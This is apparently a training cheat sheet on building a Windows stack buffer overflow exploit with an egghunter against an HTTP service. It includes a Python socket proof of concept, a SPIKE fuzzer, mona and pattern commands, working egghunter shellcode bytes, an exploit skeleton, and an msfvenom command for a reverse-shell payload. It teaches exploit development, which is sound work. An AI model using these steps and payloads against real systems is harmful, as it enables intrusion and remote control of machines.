---
title: Buffer Overflow Windows - EGGHUNTER
category: BufferOverflow
layout: 2017/sheet
tags: [Featured]
updated: 2020-07-30
keywords:
  - BufferOverflow
  - egghunter
  - 0xffff
  - stack
  - exploits
  - sec4us
  - mona
  - immunity
  - badchars
  - bytearray

---

GETTING STARTED
---------------
{: .-three-column}

### Introduction
{: .-intro}

This is a quick reference to getting started with Buffer Overflow.

- [Buffer Overflow Training](https://sec4us.com.br/exploit-development-p1/){:target="_blank"} _(learn from scratch show to create your own exploit exploring Buffer Overflow Windows)_
- [Linkedin page](https://www.linkedin.com/in/ederluis1973){:target="_blank"} _(Eder Luis - 0xffff)_
- [PDF Version Soon](https://sec4us.com.br){:target="_blank"} _(https://sec4us.com.br)_

### Immunity Debugger

**Install Immunity**

download after fill the form: 
[ https://debugger.immunityinc.com/ID_register.py ](https://debugger.immunityinc.com/ID_register.py)


### Configure Mona.py in Immunity Debugger

[download https://raw.githubusercontent.com/corelan/mona/master/mona.py](https://raw.githubusercontent.com/corelan/mona/master/mona.py)

put mona.py inside the **/pycommands** immunity directory

**Setting a **logs** directory inside Immunitydebugger**

```bash
!mona config -set workingfolder c:\logs\%p
```
* it is importart that the logs directory have been created in the windows machine with immunity.

REGISTERS
--------------------
{: .-three-column}

### What is Registers ?

Register is a small space used by CPU to store information.

### Registers - 32 bits

| 32 bits  | 16 bits |  8 bits   | |
|          |         | High | Low  |
| -------- | ------- | ---- | ---- |
| eax      |   ax    |  ah  |  al  |
| ecx      |   ax    |  ch  |  cl  |
| edx      |   dx    |  dh  |  dl  |
| ebx      |   bx    |  bh  |  bl  |
| esp      |   sp    |      | spl  |
| **EBP**      |   bp    |      | bpl  |
| esi      |   si    |      | sil  |
| edi      |   di    |      | dil  |


### IP - Instruction Pointer

Points to next instruction to be executed


| Register   | Description         |
| ---------- | ------------------- |
| `ip`         | 16 bits           |
| **`EIP `**        | 32 bits           |
| `rip`        | 64 bits           |


### SP - Stack Pointer

Points to top of stack


| Register   | Description         |
| ---------- | ------------------- |
| `sp`         | 16 bits           |
| **`ESP`**        | 32 bits           |
| `rsp`        | 64 bits           |


PROOF OF CONCEPT (POC)
----------------------
{: .-two-column}

### Example Connection WEB Application POC [poc-test.py]
```python
#!/usr/bin/python

import socket
import os
import sys

host = "x.x.x.x"
port = 8080
buffer = "A" * xxx

header = (
"HEAD /" + buffer + " HTTP/1.1\r\n"
"Host: x.x.x.x:8080\r\n"
"User-Agent: SEC4US 0xffff\r\n"
"Keep-Alive: 115\r\n"
"Connection: keep-alive\r\n\r\n")

expl = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
expl.connect((host,port))
print "Injection %s bytes" % len(buffer)
expl.send(header)
expl.close()
```

### Simple WEB Fuzzer with SPIKE [fuzzer.spk]
```bash
s_string("HEAD /");
s_string_variable("poc_value");
s_string(" ");
s_string("HTTP/1.1\r\n");
s_string("Host: x.x.x.x:8080\r\n");
s_string("User-Agent: Eder Luis - SEC4US\r\n");
s_string("Keep-Alive: 115\r\n");
s_string("Connection: Keep-Alive\r\n");
s_string("\r\n\r\n");
sleep(3);
```

running spike in the bash

```bash
generic_send_tcp x.x.x.x 8080 fuzzer.spk 0 0
```


BADCHARS
---------------------------
{: .-two-column}

### ASCII Table


| CHAR | DEC | OCT  | HEX | Linux |
| ---- | --- | ---  | --- | -----
| (nl) | 10  | 0012 | x0a |  \n |
| (cr) | 13  | 0015 | x0d |  \r |
| A    | 65  | 0101 | x41 |     |
| B    | 66  | 0102 | x42 |     |
| C    | 67  | 0103 | x43 |     |     

### Commom Badchars
After see the ascii tables, we have 3 common badchars that are bad for the applications

```bash
\x00 = Null Byte o end of string
\x0a = New Line \n (linux)
\x0d = Carriage Return  \r (linux)
```

BUFFER OVERFLOW with EGGHUNTER
------------------------------
{: .-two-column}

### 1 - Run Fuzzer
Run the fuzzer to discover how many bytes you get a buffer overflow
```bash
./fuzzer.py
```

### 2 - Run POC
Run the POC to be sure you got a buffer overflow in the stack
```bash
./poc-test.py

```

### 3 - Discover EIP Position in the Stack
creating a pattern with the bytes discovered by fuzzer
```bash
msf-pattern_create -l xxx

Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag
```
inserting the pattern inside the POC and get the address in the EIP Register (**eipaddress**)


### 4 - Discover OFFSET
Discover How Many bytes of the Offset before EIP (yyy)

msf-pattern_offset -q EIPaddress

```bash
msf-pattern_offset -q 32674231
[*] Exact match at offset 965
```
Example: 
offset = "A" * yyy
offset = "A" * 965

### 5 - Make a Stack Fitting
it is time of building the exploit. We use in this example a space of the payload with 400 bytes in the ESP

Example:
```bash
offset = "A" * yyy
eip = "BBBB"
esp = "C" * 400
buffer = offset + eip + esp
```
### 6 - Search JMP ESP

inside immunity debugger

**!mona jmp -r esp -n**
choose a DLL with less protection (SEH, ASLR, etc)

Example:
```bash
offset = "A" * yyy
eip = jmpesp-address
esp = "C" * 400
buffer = offset + eip + esp
```

### 7 - Reduced Space to Shellcode
Calculating a space to put my shellcode

NN = address-of-ESP - address-of-offset-where-i-want-to-go
           CCCCC     -        AAAA

```python
python
hex(0xCCCC - 0xAAAA)
int(0xJJ)
```

### 8 - Negative JUMP
How there is no space in the stack to put the payload, its necessary to do a negative jump to offset position to put a egghunter code.

**msf-nasm_shell**

nasm> JMP SHORT -0xJJ
Result:
```bash
\xEB\x??
```

**Stack Fitting**
```bash
offset = "A" * yyy
eip = jmpesp-address
esp = \xEB\x??
buffer = offset + eip + esp
```

### 9 - Shellcode Space
it is time to discover a new point to fit a shellcode, for example, we can put in User-Agent on the header

```python
#!/usr/bin/python

import socket
import os
import sys

host = "x.x.x.x"
port = 8080

shellcode = "T00WT00W"
shellcode += "C" * 400

offset = "A" * yyy
eip = jmpesp-address
esp = \xEB\x??
buffer = offset + eip + esp

header = (
"HEAD /" + buffer + " HTTP/1.1\r\n"
"Host: x.x.x.x:8080\r\n"
"User-Agent: " + shellcode + "\r\n"
"Keep-Alive: 115\r\n"
"Connection: keep-alive\r\n\r\n")

expl = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
expl.connect((host,port))
print "Injection %s bytes" % len(buffer)
expl.send(header)
expl.close()
```

### 10 - Looking For shellcode
After run POC.py, analize in the immunity the stack and do mona.py looking for shellcode

```bash
!mona find -s T00WT00W
```

### 11 - Build Egghunter
it is very simple to build a egghunter code by mona

```bash
!mona egg -t T00W
```
it is import add nullbytes before and after the egghunter code to analize on the stack
```python
egghunter = "\x90" * 4
egghunter += "\x66\x81\xca\xff\x0f\x42\x52\x6a\x02\x58\xcd\x2e\x3c\x05\x5a\x74"
egghunter += "\xef\xb8\x54\x30\x30\x57\x8b\xfa\xaf\x75\xea\xaf\x75\xe7\xff\xe7"
egghunter += "\x90" * 4
```

### 12 - Build exploit with egghunter
it is very simple to build a egghunter code by mona

```bash
...
shellcode = "T00WT00W"
shellcode += "C" * 400

egghunter = "\x90" * 4
egghunter += "\x66\x81\xca\xff\x0f\x42\x52\x6a\x02\x58\xcd\x2e\x3c\x05\x5a\x74"
egghunter += "\xef\xb8\x54\x30\x30\x57\x8b\xfa\xaf\x75\xea\xaf\x75\xe7\xff\xe7"
egghunter += "\x90" * 4


offset = "A" * (yyy -len(egghunter)) + egghunter
eip = jmpesp-address
esp = \xEB\x??
buffer = offset + eip + esp
...
```

### 13 - Looking For BADCHARS
inside immunity debugger
```bash
!mona bytearray
!mona bytearray -cpb "\x00\x0a\x0d"
```
get the address of the start of the bytearray in the stack (ZZZZZZZZ)
```bash
!mona compare -f c:\logs\appname\bytearray.bin -a ZZZZZZZZ
```
### 14 - Build a Payload (reverseshell)
using the msfvenom to build a payload of the reverse shell
```bash
msfvenom -p windows/shell_reverse_tcp lhost=x.x.x.x lport=xxx -b "\x00\x0a\x0d\x......." -a x86 --platform win -v esp -f python
```


## Also see
{: .-one-column}

* [Build Exploits Exploring Buffer Overflow - Helvio Junior](https://www.helviojunior.com.br/category/it/security/criacao-de-exploits/){:target="_blank"}
* [Video: Understanding Buffer Overflow Concept](https://www.youtube.com/watch?v=wLi-dGphpdg&t=806s){:target="_blank"}
* [Video: How to do a Buffer Overflow](https://www.youtube.com/watch?v=oGZ01rvbfwE&t=6s){:target="_blank"}
